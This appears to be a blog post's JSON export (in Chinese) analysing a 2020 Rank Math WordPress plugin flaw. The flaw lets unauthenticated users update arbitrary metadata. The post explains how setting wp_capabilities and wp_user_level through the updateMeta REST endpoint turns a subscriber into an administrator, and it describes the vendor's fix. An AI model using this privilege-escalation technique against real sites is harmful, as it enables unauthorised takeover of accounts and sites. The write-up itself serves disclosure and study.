元数据\n(Metadata)》一文中进行了很详细的说明，下面节选其中一段关于元数据的说明片段：\n\n![0dfe10e0b69628fca991153d2fe3affa.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142635-38a261ac-7fab-1.png)\n\n想要更深入的了解，可以阅读下这篇文章，原文链接如下\n\nhttps://www.wpzhiku.com/schedule-actions-wordpress-posts/\n\n简单来说，元数据就是数据的辅助表，对原始表单进行扩充。\n\n在WordPress 中有四种主要的内容类型，分别存储在四个数据表中：\n\nPosts、User、Comment、Link\n\n前三个都有分配给它们的元数据，存放于它们各自的元数据表中。WordPress中唯一没有元数据的对象类型（objecttype）是Link。\n\nWordPress使用3张表存储元数据：分别是wp_postmeta、wp_commentmeta与wp_usermeta\n\nwp_postmeta 存储关于posts的元数据（包括附件，导航菜单项和修改）。\n\n![a9ffad5ac725753f681082738f9ca171.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142658-465ac8e8-7fab-1.png)\n\nwp_commentmeta 存储关于评论（comments）的元数据。\n\n![d5c3fb558b07a0ca773ac17db07a2824.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142709-4d2cb9d8-7fab-1.png)\n\nwp_usermeta 存储关于用户的元数据。例如用户的level以及capabillities\n\n![b8cad581847dbcc1893da3b3a6b1cc6e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142724-55c2d14a-7fab-1.png)\n\n介绍完元数据，我们来看下upadte_metadata函数\n\n### upadte_metadata是什么\n\nWordPress提供如下函数对元数据进行操作\n\n![f64927aad7286507ec477147a9f5686b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142743-60fa5dda-7fab-1.png)\n\n我们随意跟进一个更新元数据的操作：update_user_meta()。如下图：\n\n![1c9d6f7e16f8f2c0fd359e93c5f06e45.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142756-68d0b784-7fab-1.png)\n\n上图可见，update_user_meta函数底层调用的是update_metadata函数进行更新操作。\n\n除了update_user_meta之外，update_post_meta以及update_comment_meta等更新操作底层调用的都是update_metadata。由此可见，update_metadata具有直接更新任意类型元数据的功能。\n\n利用Rank Math插件中注册的接口，未经身份验证的攻击者可以直接调用upadte_metadata，更新任意类型的元数据:例如wp_user_level以及wp_capabilities，这将导致攻击者可以将其订阅者权限的账号提权为管理员，或者将管理员的账号改为订阅者权限以限制管理员登陆。造成比较严重的危害。\n\n漏洞利用\n--------\n\n在分析完漏洞触发点以及漏洞之后，我们来看一下如何调用这个存在漏洞的自定义接口。首先我们查看下Wordpress中注册的接口信息。见下图：\n\n![37eec1da970f4b54b4fe1e21dde238f9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142818-75fbd088-7fab-1.png)\n\n上图红框处，即为存在漏洞的接口\n\n可见，接口url为*http://127.0.0.1/wordpress/wp-json/rankmath/v1/updateMeta* ,访问方式为POST请求\n\n现在攻击者拥有一个目标WordPress账户，名为kumamon，权限为订阅者。见下图红框处：\n\n![76eb36def22d7813a351fe782a2a9f6e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142850-89350520-7fab-1.png)\n\n此时我们查看一下wp_usermeta表可以发现，攻击者拥有的账户在该表中的属性如下图：\n\n![36ad6a765bd3bbe9577cd2e9b38270d5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142905-91e74ec6-7fab-1.png)\n\n如上图所示，第一个红框处的wp_user_level属性值为0。第二个红框处的wp_capabillities属性值为a:1:{s:10:\"subscriber\";b:1;}\n\n再反观我们管理员admin账号\n\n![03d46db68754346bc7a3ad45f693b64d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142916-98a451be-7fab-1.png)\n\n可见wp_user_level属性值为10，而wp_capabillities属性值为a:1:{s:13:\"administrator\";b:1;}\n\n因此我们可以通过调用接口，通过底层的update_metadata函数，将kumamon账号的wp_user_level与wp_capabillities属性值修改为与管理员账号相同值。\n\n想要构造利用payload，我们仍需要分析下接口的传参情况。见下图：\n\n![fe26f1dfdf497f1463c4d97316634d34.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142927-9f5d08fc-7fab-1.png)\n\n上图红框处objectType参数很明显是user，meta参数是要修改的键值对，而objectID这里自然是对应的数据库表中的user_id字段了。但是攻击者账号kumamon对应的user_id是多少？如果不知道这个user_id，攻击者是无法精准的将自己控制的账号进行提权操作。\n\n经过分析发现，在个人资料的页面中包含此信息\n\n![764ec7d02e9fca5806fd923e9ab4f5c1.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142940-a70560ae-7fab-1.png)\n\n该页面查看源码，即可看见当前用户userid的值，见下图红框处，值为4\n\n![29727aa6692f4e9d49eaf81c0531f8bc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142952-ae4dc6d0-7fab-1.png)\n\n因此构造数据包如下：\n\n![63f1944da613d10cb62f5e8d07a945c3.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416143005-b6090fec-7fab-1.png)\n\n当数据包发送完毕后，kumamon账号的权限随即变为管理员\n\n![e0ecc2c2facf4b7e293564f748a09ca9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416143018-bd8eae7a-7fab-1.png)\n\n漏洞修复\n--------\n\n在1.0.41.2版本中，Rank Math已经对该漏洞进行修复。见下图：\n\n![bc960eaeeb9a953a9cd8c89aa3f3d554.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416143028-c3aa52b4-7fab-1.png)\n\nRank Math对存在漏洞的接口调用了get_object_permissions_check方法进行权限校验，从而避免了未经授权用户的攻击行为\n\nget_object_permissions_check方法也是1.0.41.2版本中新引进的，具体如下：\n\n![842f8575b6cd6d64ca7ee7b0f49d2c52.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416143042-cc11abdc-7fab-1.png)\n\n底层采用了WordPress 的current_user_can方法进行权限校验","source":"_posts/RankMath.md","raw":"---\ntitle: WordPress Rank Math SEO插件任意元数据修改漏洞分析\ndate: 2020-04-16 14:36:37\ntags: web漏洞分析\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5f6ca87fda316a1b5a989b5d286a918.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nRank Math是一款旨在帮助搜索引擎优化的WordPress插件，被称之为“WordPress SEO的瑞士军刀”。 Rank Math与Yoast SEO、All in One SEO Pack下载量排WordPress SEO工具下载量前三，但其功能方面完全不输Yoast付费版，几乎可以满足用户对SEO的所有需求。更重要的是，Rank Math是一款免费插件。\n\n<!--more-->\n\n漏洞描述\n--------\n\n近日有研究团队发现，Rank Math插件中存在一个严重的漏洞，未经身份验证的攻击者可以利用该漏洞更新WordPress站点中的任意元数据。这将导致攻击者可以修改任意现有的文章、评论，跟或是将普通权限的用户提权为管理员，将管理员权限用户降级。\n\n漏洞分析\n--------\n\n首先我们来看一下Rank Math插件中的漏洞触发点\n\n漏洞触发点位于\\\\wp-content\\\\plugins\\\\seo-by-rank-math\\\\includes\\\\rest\\\\class-admin.php，见下图:\n\n![6e9b1fd60b8e1a6d934ef7e1c6b3c05b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142425-eb043ce0-7faa-1.png)\n\n通过上图可见，class-admin.php文件中的gutenberg_routes方法通过register_rest_route方法注册了一个自定义接口\n\n当该自定义接口被调用后，$this->update_metadata方法将作为回调函数被调用。见下图红框处：\n\n![4e8777ce7736d41e89dc60c51fb10859.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142437-f285ead6-7faa-1.png)\n\n接下来看一下$this->update_metadata方法，仍然是位于\\wp-content\\plugins\\seo-by-rank-math\\includes\\rest\\class-admin.php中。见下图：\n\n![2b09038ee7b7fc4bf4485395e487dc8d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142454-fc7b3cda-7faa-1.png)\n\n首先分析$this->update_metadata方法中传入的参数。见下图红框处\n\n![c9aa3ac8a4bea18330c48e3fd2046b5d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142521-0c590bf0-7fab-1.png)\n\n$this->update_metadata方法从请求的参数中获取objectID、objectType与meta三个参数，分别赋值给$object_id、$object_type与$meta\n\n接着从$meta取出键值对，并与$object_id、$object_type参数一同传递给update_metadata方法。如下图：\n\n![40e68f1f1c8afe31db270e0d61712214.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142546-1bb2ce10-7fab-1.png)\n\n我们具体分析一下上图中的update_metadata方法。update_metadata方法位于\\wp-includes\\meta.php文件中。见下图：\n\n![d66963aea399a33288c2f1d0ee7ff316.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142611-2a28fcc6-7fab-1.png)\n\nupdate_metadata方法是wordpress中用来操作元数据的操作函数，其作用是更新指定对象的元数据。\n\n本次漏洞可以利用该update_metadata函数更新任意指定元数据。那不得不提一下wordpress元数据是什么\n\n### 什么是元数据（Metadata）\n\n元数据可描述为关于数据的数据。通常元数据有如下两种：\n\n**1、结构化的元数据（Structural metadata）**是有关数据结构的设计和说明，通常叫做“关于数据容器的数据（data about the containers of data）；\n\n**2、描述性的元数据（descriptive metadata）**，关于应用程序数据和数据内容的单个实例。\n\n我们首先看下wordpress开发手册上关于元数据的解释：\n\n“元数据根据其定义，是有关信息的信息。\n在WordPress的情况下，它是与帖子，用户，评论和条款相关的信息。”\n\n这里的定义不是很好理解，关于元数据，《深入理解 WordPress 元数据\n(Metadata)》一文中进行了很详细的说明，下面节选其中一段关于元数据的说明片段：\n\n![0dfe10e0b69628fca991153d2fe3affa.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142635-38a261ac-7fab-1.png)\n\n想要更深入的了解，可以阅读下这篇文章，原文链接如下\n\nhttps://www.wpzhiku.com/schedule-actions-wordpress-posts/\n\n简单来说，元数据就是数据的辅助表，对原始表单进行扩充。\n\n在WordPress 中有四种主要的内容类型，分别存储在四个数据表中：\n\nPosts、User、Comment、Link\n\n前三个都有分配给它们的元数据，存放于它们各自的元数据表中。WordPress中唯一没有元数据的对象类型（objecttype）是Link。\n\nWordPress使用3张表存储元数据：分别是wp_postmeta、wp_commentmeta与wp_usermeta\n\nwp_postmeta 存储关于posts的元数据（包括附件，导航菜单项和修改）。\n\n![a9ffad5ac725753f681082738f9ca171.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142658-465ac8e8-7fab-1.png)\n\nwp_commentmeta 存储关于评论（comments）的元数据。\n\n![d5c3fb558b07a0ca773ac17db07a2824.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142709-4d2cb9d8-7fab-1.png)\n\nwp_usermeta 存储关于用户的元数据。例如用户的level以及capabillities\n\n![b8cad581847dbcc1893da3b3a6b1cc6e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142724-55c2d14a-7fab-1.png)\n\n介绍完元数据，我们来看下upadte_metadata函数\n\n### upadte_metadata是什么\n\nWordPress提供如下函数对元数据进行操作\n\n![f64927aad7286507ec477147a9f5686b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142743-60fa5dda-7fab-1.png)\n\n我们随意跟进一个更新元数据的操作：update_user_meta()。如下图：\n\n![1c9d6f7e16f8f2c0fd359e93c5f06e45.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142756-68d0b784-7fab-1.png)\n\n上图可见，update_user_meta函数底层调用的是update_metadata函数进行更新操作。\n\n除了update_user_meta之外，update_post_meta以及update_comment_meta等更新操作底层调用的都是update_metadata。由此可见，update_metadata具有直接更新任意类型元数据的功能。\n\n利用Rank Math插件中注册的接口，未经身份验证的攻击者可以直接调用upadte_metadata，更新任意类型的元数据:例如wp_user_level以及wp_capabilities，这将导致攻击者可以将其订阅者权限的账号提权为管理员，或者将管理员的账号改为订阅者权限以限制管理员登陆。造成比较严重的危害。\n\n漏洞利用\n--------\n\n在分析完漏洞触发点以及漏洞之后，我们来看一下如何调用这个存在漏洞的自定义接口。首先我们查看下Wordpress中注册的接口信息。见下图：\n\n![37eec1da970f4b54b4fe1e21dde238f9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142818-75fbd088-7fab-1.png)\n\n上图红框处，即为存在漏洞的接口\n\n可见，接口url为*http://127.0.0.1/wordpress/wp-json/rankmath/v1/updateMeta* ,访问方式为POST请求\n\n现在攻击者拥有一个目标WordPress账户，名为kumamon，权限为订阅者。见下图红框处：\n\n![76eb36def22d7813a351fe782a2a9f6e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142850-89350520-7fab-1.png)\n\n此时我们查看一下wp_usermeta表可以发现，攻击者拥有的账户在该表中的属性如下图：\n\n![36ad6a765bd3bbe9577cd2e9b38270d5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142905-91e74ec6-7fab-1.png)\n\n如上图所示，第一个红框处的wp_user_level属性值为0。第二个红框处的wp_capabillities属性值为a:1:{s:10:\"subscriber\";b:1;}\n\n再反观我们管理员admin账号\n\n![03d46db68754346bc7a3ad45f693b64d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142916-98a451be-7fab-1.png)\n\n可见wp_user_level属性值为10，而wp_capabillities属性值为a:1:{s:13:\"administrator\";b:1;}\n\n因此我们可以通过调用接口，通过底层的update_metadata函数，将kumamon账号的wp_user_level与wp_capabillities属性值修改为与管理员账号相同值。\n\n想要构造利用payload，我们仍需要分析下接口的传参情况。见下图：\n\n![fe26f1dfdf497f1463c4d97316634d34.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142927-9f5d08fc-7fab-1.png)\n\n上图红框处objectType参数很明显是user，meta参数是要修改的键值对，而objectID这里自然是对应的数据库表中的user_id字段了。但是攻击者账号kumamon对应的user_id是多少？如果不知道这个user_id，攻击者是无法精准的将自己控制的账号进行提权操作。\n\n经过分析发现，在个人资料的页面中包含此信息\n\n![764ec7d02e9fca5806fd923e9ab4f5c1.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142940-a70560ae-7fab-1.png)\n\n该页面查看源码，即可看见当前用户userid的值，见下图红框处，值为4\n\n![29727aa6692f4e9d49eaf81c0531f8bc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416142952-ae4dc6d0-7fab-1.png)\n\n因此构造数据包如下：\n\n![63f1944da613d10cb62f5e8d07a945c3.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416143005-b6090fec-7fab-1.png)\n\n当数据包发送完毕后，kumamon账号的权限随即变为管理员\n\n![e0ecc2c2facf4b7e293564f748a09ca9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416143018-bd8eae7a-7fab-1.png)\n\n漏洞修复\n--------\n\n在1.0.41.2版本中，Rank Math已经对该漏洞进行修复。见下图：\n\n![bc960eaeeb9a953a9cd8c89aa3f3d554.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416143028-c3aa52b4-7fab-1.png)\n\nRank Math对存在漏洞的接口调用了get_object_permissions_check方法进行权限校验，从而避免了未经授权用户的攻击行为\n\nget_object_permissions_check方法也是1.0.41.2版本中新引进的，具体如下：\n\n![842f8575b6cd6d64ca7ee7b0f49d2c52.png](https://xzfile.aliyuncs.com/media/upload/picture/20200416143042-cc11abdc-7fab-1.png)\n\n底层采用了WordPress 的current_user_can方法进行权限校验","slug":"RankMath","published":1,"updated":"2020-10-27T09:25:29.608Z","_id":"ckgrozu8q001hwsa90pib3nrr","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Rank Math是一款旨在帮助搜索引擎优化的WordPress插件，被称之为“WordPress SEO的瑞士军刀”。 Rank Math与Yoast SEO、All in One SEO Pack下载量排WordPress SEO工具下载量前三，但其功能方面完全不输Yoast付费版，几乎可以满足用户对SEO的所有需求。更重要的是，Rank Math是一款免费插件。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h2><p>近日有研究团队发现，Rank Math插件中存在一个严重的漏洞，未经身份验证的攻击者可以利用该漏洞更新WordPress站点中的任意元数据。这将导致攻击者可以修改任意现有的文章、评论，跟或是将普通权限的用户提权为管理员，将管理员权限用户降级。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>首先我们来看一下Rank Math插件中的漏洞触发点</p>\n<p>漏洞触发点位于\\wp-content\\plugins\\seo-by-rank-math\\includes\\rest\\class-admin.php，见下图:</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142425-eb043ce0-7faa-1.png\" alt=\"6e9b1fd60b8e1a6d934ef7e1c6b3c05b.png\"></p>\n<p>通过上图可见，class-admin.php文件中的gutenberg_routes方法通过register_rest_route方法注册了一个自定义接口</p>\n<p>当该自定义接口被调用后，$this-&gt;update_metadata方法将作为回调函数被调用。见下图红框处：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142437-f285ead6-7faa-1.png\" alt=\"4e8777ce7736d41e89dc60c51fb10859.png\"></p>\n<p>接下来看一下$this-&gt;update_metadata方法，仍然是位于\\wp-content\\plugins\\seo-by-rank-math\\includes\\rest\\class-admin.php中。见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142454-fc7b3cda-7faa-1.png\" alt=\"2b09038ee7b7fc4bf4485395e487dc8d.png\"></p>\n<p>首先分析$this-&gt;update_metadata方法中传入的参数。见下图红框处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142521-0c590bf0-7fab-1.png\" alt=\"c9aa3ac8a4bea18330c48e3fd2046b5d.png\"></p>\n<p>$this-&gt;update_metadata方法从请求的参数中获取objectID、objectType与meta三个参数，分别赋值给$object_id、$object_type与$meta</p>\n<p>接着从$meta取出键值对，并与$object_id、$object_type参数一同传递给update_metadata方法。如下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142546-1bb2ce10-7fab-1.png\" alt=\"40e68f1f1c8afe31db270e0d61712214.png\"></p>\n<p>我们具体分析一下上图中的update_metadata方法。update_metadata方法位于\\wp-includes\\meta.php文件中。见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142611-2a28fcc6-7fab-1.png\" alt=\"d66963aea399a33288c2f1d0ee7ff316.png\"></p>\n<p>update_metadata方法是wordpress中用来操作元数据的操作函数，其作用是更新指定对象的元数据。</p>\n<p>本次漏洞可以利用该update_metadata函数更新任意指定元数据。那不得不提一下wordpress元数据是什么</p>\n<h3 id=\"什么是元数据（Metadata）\"><a href=\"#什么是元数据（Metadata）\" class=\"headerlink\" title=\"什么是元数据（Metadata）\"></a>什么是元数据（Metadata）</h3><p>元数据可描述为关于数据的数据。通常元数据有如下两种：</p>\n<p><strong>1、结构化的元数据（Structural metadata）</strong>是有关数据结构的设计和说明，通常叫做“关于数据容器的数据（data about the containers of data）；</p>\n<p><strong>2、描述性的元数据（descriptive metadata）</strong>，关于应用程序数据和数据内容的单个实例。</p>\n<p>我们首先看下wordpress开发手册上关于元数据的解释：</p>\n<p>“元数据根据其定义，是有关信息的信息。<br>在WordPress的情况下，它是与帖子，用户，评论和条款相关的信息。”</p>\n<p>这里的定义不是很好理解，关于元数据，《深入理解 WordPress 元数据<br>(Metadata)》一文中进行了很详细的说明，下面节选其中一段关于元数据的说明片段：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142635-38a261ac-7fab-1.png\" alt=\"0dfe10e0b69628fca991153d2fe3affa.png\"></p>\n<p>想要更深入的了解，可以阅读下这篇文章，原文链接如下</p>\n<p><a href=\"https://www.wpzhiku.com/schedule-actions-wordpress-posts/\">https://www.wpzhiku.com/schedule-actions-wordpress-posts/</a></p>\n<p>简单来说，元数据就是数据的辅助表，对原始表单进行扩充。</p>\n<p>在WordPress 中有四种主要的内容类型，分别存储在四个数据表中：</p>\n<p>Posts、User、Comment、Link</p>\n<p>前三个都有分配给它们的元数据，存放于它们各自的元数据表中。WordPress中唯一没有元数据的对象类型（objecttype）是Link。</p>\n<p>WordPress使用3张表存储元数据：分别是wp_postmeta、wp_commentmeta与wp_usermeta</p>\n<p>wp_postmeta 存储关于posts的元数据（包括附件，导航菜单项和修改）。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142658-465ac8e8-7fab-1.png\" alt=\"a9ffad5ac725753f681082738f9ca171.png\"></p>\n<p>wp_commentmeta 存储关于评论（comments）的元数据。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142709-4d2cb9d8-7fab-1.png\" alt=\"d5c3fb558b07a0ca773ac17db07a2824.png\"></p>\n<p>wp_usermeta 存储关于用户的元数据。例如用户的level以及capabillities</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142724-55c2d14a-7fab-1.png\" alt=\"b8cad581847dbcc1893da3b3a6b1cc6e.png\"></p>\n<p>介绍完元数据，我们来看下upadte_metadata函数</p>\n<h3 id=\"upadte-metadata是什么\"><a href=\"#upadte-metadata是什么\" class=\"headerlink\" title=\"upadte_metadata是什么\"></a>upadte_metadata是什么</h3><p>WordPress提供如下函数对元数据进行操作</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142743-60fa5dda-7fab-1.png\" alt=\"f64927aad7286507ec477147a9f5686b.png\"></p>\n<p>我们随意跟进一个更新元数据的操作：update_user_meta()。如下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142756-68d0b784-7fab-1.png\" alt=\"1c9d6f7e16f8f2c0fd359e93c5f06e45.png\"></p>\n<p>上图可见，update_user_meta函数底层调用的是update_metadata函数进行更新操作。</p>\n<p>除了update_user_meta之外，update_post_meta以及update_comment_meta等更新操作底层调用的都是update_metadata。由此可见，update_metadata具有直接更新任意类型元数据的功能。</p>\n<p>利用Rank Math插件中注册的接口，未经身份验证的攻击者可以直接调用upadte_metadata，更新任意类型的元数据:例如wp_user_level以及wp_capabilities，这将导致攻击者可以将其订阅者权限的账号提权为管理员，或者将管理员的账号改为订阅者权限以限制管理员登陆。造成比较严重的危害。</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>在分析完漏洞触发点以及漏洞之后，我们来看一下如何调用这个存在漏洞的自定义接口。首先我们查看下Wordpress中注册的接口信息。见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142818-75fbd088-7fab-1.png\" alt=\"37eec1da970f4b54b4fe1e21dde238f9.png\"></p>\n<p>上图红框处，即为存在漏洞的接口</p>\n<p>可见，接口url为<em><a href=\"http://127.0.0.1/wordpress/wp-json/rankmath/v1/updateMeta\">http://127.0.0.1/wordpress/wp-json/rankmath/v1/updateMeta</a></em> ,访问方式为POST请求</p>\n<p>现在攻击者拥有一个目标WordPress账户，名为kumamon，权限为订阅者。见下图红框处：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142850-89350520-7fab-1.png\" alt=\"76eb36def22d7813a351fe782a2a9f6e.png\"></p>\n<p>此时我们查看一下wp_usermeta表可以发现，攻击者拥有的账户在该表中的属性如下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142905-91e74ec6-7fab-1.png\" alt=\"36ad6a765bd3bbe9577cd2e9b38270d5.png\"></p>\n<p>如上图所示，第一个红框处的wp_user_level属性值为0。第二个红框处的wp_capabillities属性值为a:1:{s:10:”subscriber”;b:1;}</p>\n<p>再反观我们管理员admin账号</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142916-98a451be-7fab-1.png\" alt=\"03d46db68754346bc7a3ad45f693b64d.png\"></p>\n<p>可见wp_user_level属性值为10，而wp_capabillities属性值为a:1:{s:13:”administrator”;b:1;}</p>\n<p>因此我们可以通过调用接口，通过底层的update_metadata函数，将kumamon账号的wp_user_level与wp_capabillities属性值修改为与管理员账号相同值。</p>\n<p>想要构造利用payload，我们仍需要分析下接口的传参情况。见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142927-9f5d08fc-7fab-1.png\" alt=\"fe26f1dfdf497f1463c4d97316634d34.png\"></p>\n<p>上图红框处objectType参数很明显是user，meta参数是要修改的键值对，而objectID这里自然是对应的数据库表中的user_id字段了。但是攻击者账号kumamon对应的user_id是多少？如果不知道这个user_id，攻击者是无法精准的将自己控制的账号进行提权操作。</p>\n<p>经过分析发现，在个人资料的页面中包含此信息</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142940-a70560ae-7fab-1.png\" alt=\"764ec7d02e9fca5806fd923e9ab4f5c1.png\"></p>\n<p>该页面查看源码，即可看见当前用户userid的值，见下图红框处，值为4</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142952-ae4dc6d0-7fab-1.png\" alt=\"29727aa6692f4e9d49eaf81c0531f8bc.png\"></p>\n<p>因此构造数据包如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416143005-b6090fec-7fab-1.png\" alt=\"63f1944da613d10cb62f5e8d07a945c3.png\"></p>\n<p>当数据包发送完毕后，kumamon账号的权限随即变为管理员</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416143018-bd8eae7a-7fab-1.png\" alt=\"e0ecc2c2facf4b7e293564f748a09ca9.png\"></p>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p>在1.0.41.2版本中，Rank Math已经对该漏洞进行修复。见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416143028-c3aa52b4-7fab-1.png\" alt=\"bc960eaeeb9a953a9cd8c89aa3f3d554.png\"></p>\n<p>Rank Math对存在漏洞的接口调用了get_object_permissions_check方法进行权限校验，从而避免了未经授权用户的攻击行为</p>\n<p>get_object_permissions_check方法也是1.0.41.2版本中新引进的，具体如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416143042-cc11abdc-7fab-1.png\" alt=\"842f8575b6cd6d64ca7ee7b0f49d2c52.png\"></p>\n<p>底层采用了WordPress 的current_user_can方法进行权限校验</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>Rank Math是一款旨在帮助搜索引擎优化的WordPress插件，被称之为“WordPress SEO的瑞士军刀”。 Rank Math与Yoast SEO、All in One SEO Pack下载量排WordPress SEO工具下载量前三，但其功能方面完全不输Yoast付费版，几乎可以满足用户对SEO的所有需求。更重要的是，Rank Math是一款免费插件。</p>","more":"<h2 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h2><p>近日有研究团队发现，Rank Math插件中存在一个严重的漏洞，未经身份验证的攻击者可以利用该漏洞更新WordPress站点中的任意元数据。这将导致攻击者可以修改任意现有的文章、评论，跟或是将普通权限的用户提权为管理员，将管理员权限用户降级。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>首先我们来看一下Rank Math插件中的漏洞触发点</p>\n<p>漏洞触发点位于\\wp-content\\plugins\\seo-by-rank-math\\includes\\rest\\class-admin.php，见下图:</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200416142425-eb043ce0-7faa-1.png\" alt=\"6e9b1fd60b8e1a6d934ef7e1c6b3c05b.png\"></p>\n<p>通过上图可见，class-admin.php文件中的gutenberg_routes方法通过register_rest_route方法注册了一个自定义接口</p>\n<p>当该自定义接口被调用后，$this-&gt;update_metadata方法将作为回调函数被调用。见下图红框处：</p>\n<p><img 